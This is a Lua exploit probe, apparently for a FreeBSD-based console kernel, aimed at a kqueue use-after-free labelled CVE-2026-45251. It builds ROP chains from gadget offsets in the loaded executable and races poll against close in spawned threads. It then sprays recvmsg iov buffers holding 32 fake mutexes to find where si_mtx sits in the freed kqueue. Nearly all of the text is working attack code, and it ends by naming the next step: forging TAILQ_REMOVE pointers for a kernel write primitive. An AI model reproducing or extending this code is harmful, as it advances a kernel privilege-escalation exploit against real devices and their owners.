-- CRASH_CLASS: HIGH
-- PROBE 500i: si_mtx offset scanner within freed kqueue (CVE-2026-45251)
--
-- Context: 500h confirmed recvmsg iov spray reclaims freed kqueue slot.
-- seltdclear reads si_mtx from reclaimed data → locks our userland fake_mtx.
-- Canaries at fake_mtx+0x18/+0x20 were modified (low byte zeroed).
--
-- This probe: 32 UNIQUE fake mutexes, one per qword position in 256B iov.
-- After race+spray, check which was hit → si_mtx byte offset in kqueue.
-- Estimated: +0x88 (qword #17) based on FreeBSD 11 kqueue/selinfo layout.

print("=== PROBE 500i: si_mtx OFFSET SCANNER ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_pop_rcx   = eb + 0xE64
local g_pop_r8    = eb + 0x991
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))

local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

-- ========== A: 32 unique fake mutexes ==========
print("--- A: Building 32 unique fake mutexes ---")

local NUM_POS = 32
local mtx_arr = {}

for i = 0, NUM_POS - 1 do
    local fm = memory.alloc(0x30)
    for j = 0, 0x2C, 4 do wd(N(fm) + j, 0) end

    -- lo_name (+0x00): point to readable string at fm+0x28 ("M\0")
    wq(N(fm) + 0x28, uint64(0x4D))  -- 'M' + NUL
    wq(N(fm), uint64(N(fm) + 0x28))
    -- lo_flags (+0x08): 1 (same as 500h proven value)
    wd(N(fm) + 8, 1)
    -- lo_data (+0x0C): 0
    wd(N(fm) + 0xC, 0)
    -- mtx_lock (+0x10): MTX_UNOWNED = 4
    wq(N(fm) + 0x10, uint64(4))

    -- canary1 at +0x18: hi=0xBB00_(i+1), lo=0xBB00_(i+1)
    -- (i+1) ensures low byte is never 0, so byte-zeroing is detectable
    local tag = i + 1
    local c1hi = 0xBB000000 + tag
    local c1lo = 0xBB000000 + tag
    wq(N(fm) + 0x18, uint64(string.format("0x%08X%08X", c1hi, c1lo)))

    -- canary2 at +0x20: hi=0xCC00_(i+1), lo=0xCC00_(i+1)
    local c2hi = 0xCC000000 + tag
    local c2lo = 0xCC000000 + tag
    wq(N(fm) + 0x20, uint64(string.format("0x%08X%08X", c2hi, c2lo)))

    mtx_arr[i] = {
        addr = fm, tag = tag,
        c1hi = c1hi, c1lo = c1lo,
        c2hi = c2hi, c2lo = c2lo
    }
end
print("  done: 32 mutexes allocated")

-- Print a few addresses for correlation
for _, idx in ipairs({0, 8, 16, 17, 18, 24, 31}) do
    if mtx_arr[idx] then
        print(string.format("  mtx[%2d] (off 0x%02X) = %s", idx, idx*8, fmt(uint64(N(mtx_arr[idx].addr)))))
    end
end

-- ========== B: iov buffer with unique pointers ==========
local iov_buf = memory.alloc(256 + 16)
for i = 0, NUM_POS - 1 do
    wq(N(iov_buf) + i * 8, uint64(N(mtx_arr[i].addr)))
end

local function make_msghdr()
    local mh = memory.alloc(0x30)
    wq(N(mh), uint64(0))
    wd(N(mh) + 8, 0)
    wq(N(mh) + 0x10, uint64(N(iov_buf)))
    wd(N(mh) + 0x18, 16)
    wq(N(mh) + 0x20, uint64(0))
    wd(N(mh) + 0x28, 0)
    wd(N(mh) + 0x2C, 0)
    return mh
end

-- ========== Thread builders (from 500h) ==========

local function build_poller(gate_rd, pollfd_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(3000))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_closer(gate_rd, target_fd, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(target_fd))
    emit(g_pop_rax); emit(uint64(6)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_spray_child(gate_rd, sock_rd, msghdr_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rax); emit(uint64(1))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(sock_rd))
    emit(g_pop_rsi); emit(uint64(msghdr_addr))
    emit(g_pop_rdx); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(29)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- ========== C: Race + spray with offset detection ==========
print("")
print("--- C: Race + spray offset scan ---")

local NUM_SPRAY = 10
local sc_kqueue = mk(362)

local function reset_all_canaries()
    for i = 0, NUM_POS - 1 do
        local fm = mtx_arr[i].addr
        wd(N(fm) + 0xC, 0)
        wq(N(fm) + 0x10, uint64(4))
        wq(N(fm) + 0x18, uint64(string.format("0x%08X%08X", mtx_arr[i].c1hi, mtx_arr[i].c1lo)))
        wq(N(fm) + 0x20, uint64(string.format("0x%08X%08X", mtx_arr[i].c2hi, mtx_arr[i].c2lo)))
    end
end

local function check_all_canaries()
    local hits = {}
    for i = 0, NUM_POS - 1 do
        local fm = mtx_arr[i].addr
        local c1 = rq(uint64(N(fm) + 0x18))
        local c1h, c1l = get_hi_lo(c1)
        local c2 = rq(uint64(N(fm) + 0x20))
        local c2h, c2l = get_hi_lo(c2)
        local lo_data = rd(N(fm) + 0xC) or 0
        local mtx_val = rq(uint64(N(fm) + 0x10))
        local mh, ml = get_hi_lo(mtx_val)

        local c1_chg = (c1h ~= mtx_arr[i].c1hi) or (c1l ~= mtx_arr[i].c1lo)
        local c2_chg = (c2h ~= mtx_arr[i].c2hi) or (c2l ~= mtx_arr[i].c2lo)
        local ld_chg = (lo_data ~= 0)
        local mt_chg = (mh ~= 0 or ml ~= 4)

        if c1_chg or c2_chg or ld_chg or mt_chg then
            hits[#hits + 1] = {
                pos = i, off = i * 8,
                c1_chg = c1_chg, c2_chg = c2_chg,
                ld_chg = ld_chg, mt_chg = mt_chg,
                c1 = fmt(c1), c2 = fmt(c2),
                lo_data = lo_data, mtx_lock = fmt(mtx_val)
            }
        end
    end
    return hits
end

local function run_scan(label)
    print("[" .. label .. "]")
    reset_all_canaries()

    local kq = sgn(sc_kqueue())
    if kq < 0 then print("  kqueue fail"); return nil end
    print("  kq_fd=" .. kq)

    local gA_r, gA_w = make_gate()
    local gB_r, gB_w = make_gate()
    if not gA_r or not gB_r then
        pcall(function() mk(6)(uint64(kq)) end)
        print("  gate fail"); return nil
    end

    local spray = {}
    for s = 1, NUM_SPRAY do
        local sv = memory.alloc(8)
        wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
        pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
        local sr = rd(N(sv)) or 0xFFFF
        local sw = rd(N(sv) + 4) or 0xFFFF
        local gr, gw = make_gate()
        local smk = memory.alloc(8); wd(N(smk), 0); wd(N(smk) + 4, 0)
        local mh = make_msghdr()
        if sr ~= 0xFFFF and gr then
            pcall(function()
                mk(455)(build_spray_child(gr, sr, N(mh), N(smk)), uint64(0x38))
            end)
            spray[#spray + 1] = {rd=sr, wr=sw, gr=gr, gw=gw, mk=smk}
        end
    end
    print("  spray: " .. #spray .. "/" .. NUM_SPRAY)

    local pollfd = memory.alloc(8)
    wd(N(pollfd), kq); wd(N(pollfd) + 4, 0x00010000)
    local mA = memory.alloc(8); wd(N(mA), 0); wd(N(mA) + 4, 0xAA)
    local mB = memory.alloc(8); wd(N(mB), 0); wd(N(mB) + 4, 0xBB)

    pcall(function() mk(455)(build_poller(gA_r, N(pollfd), N(mA)), uint64(0x38)) end)
    pcall(function() mk(455)(build_closer(gB_r, kq, N(mB)), uint64(0x38)) end)

    -- Phase 1: poller enters poll
    pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
    for d = 1, 50000 do local _ = rd(N(mA)) end

    -- Phase 2: closer fires
    pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)
    for w = 1, 500000 do
        if rd(N(mB) + 4) ~= 0xBB then break end
    end
    if not alive() then print("  DIED after close"); return check_all_canaries() end
    print("  close done")

    -- Phase 3: spray gates
    for _, sd in ipairs(spray) do
        pcall(function() mk(4)(uint64(sd.gw), uint64(N(one_byte)), uint64(1)) end)
    end

    -- Phase 4: wait for poll timeout (~3s)
    print("  waiting for poll timeout...")
    for w = 1, 8000000 do
        if not alive() then break end
        if rd(N(mA) + 4) ~= 0xAA then break end
    end

    if not alive() then
        print("  DIED during seltdclear")
        return check_all_canaries()
    end

    local pv = rd(N(mA)) or -99
    print("  poll_rv=" .. pv)

    local hits = check_all_canaries()

    -- Cleanup
    for _, sd in ipairs(spray) do
        pcall(function() mk(6)(uint64(sd.rd)) end)
        pcall(function() mk(6)(uint64(sd.wr)) end)
        pcall(function() mk(6)(uint64(sd.gr)) end)
        pcall(function() mk(6)(uint64(sd.gw)) end)
    end
    pcall(function() mk(6)(uint64(gA_r)) end); pcall(function() mk(6)(uint64(gA_w)) end)
    pcall(function() mk(6)(uint64(gB_r)) end); pcall(function() mk(6)(uint64(gB_w)) end)

    return hits
end

-- ========== D: Run 3 iterations ==========
local all_hits = {}
for iter = 1, 3 do
    if not alive() then break end
    local hits = run_scan(string.format("iter %d/3", iter))
    if hits then
        for _, h in ipairs(hits) do
            all_hits[#all_hits + 1] = h
            local flags = ""
            if h.c1_chg then flags = flags .. "c1 " end
            if h.c2_chg then flags = flags .. "c2 " end
            if h.ld_chg then flags = flags .. "ld " end
            if h.mt_chg then flags = flags .. "mt " end
            print(string.format("  >>> HIT q#%d off=0x%02X [%s] c1=%s c2=%s mtx=%s ld=%d",
                h.pos, h.off, flags, h.c1, h.c2, h.mtx_lock, h.lo_data))
        end
        if #hits == 0 then print("  no hits") end
    end
    print("")
end

-- ========== E: Summary ==========
print("========================================")
print("si_mtx OFFSET SCAN RESULTS")
print("========================================")

if #all_hits == 0 then
    print("NO HITS — try more spray, longer wait, or crash oracle")
else
    local pos_counts = {}
    for _, h in ipairs(all_hits) do
        local key = h.pos
        if not pos_counts[key] then pos_counts[key] = 0 end
        pos_counts[key] = pos_counts[key] + 1
    end

    local sorted = {}
    for pos, cnt in pairs(pos_counts) do
        sorted[#sorted + 1] = {pos = pos, cnt = cnt}
    end
    table.sort(sorted, function(a, b) return a.cnt > b.cnt end)

    for _, e in ipairs(sorted) do
        local off = e.pos * 8
        print(string.format("  offset 0x%02X (qword #%d): %d hit(s)", off, e.pos, e.cnt))
    end

    local best = sorted[1]
    if best then
        local off = best.pos * 8
        print("")
        print(string.format("*** si_mtx OFFSET = 0x%02X (qword #%d, %d/%d hits) ***",
            off, best.pos, best.cnt, #all_hits))
        local sel_start = off - 0x40
        if sel_start >= 0 then
            print(string.format("*** kq_sel starts at kqueue+0x%02X ***", sel_start))
            print(string.format("*** si_tdlist at kqueue+0x%02X (tqh_first/tqh_last) ***", sel_start))
        end
        print("")
        print("Next: forge TAILQ_REMOVE pointers for kernel write primitive")
    end
end

print("alive=" .. tostring(alive()))
print("========================================")
print("")
print("=== PROBE 500i COMPLETE ===")
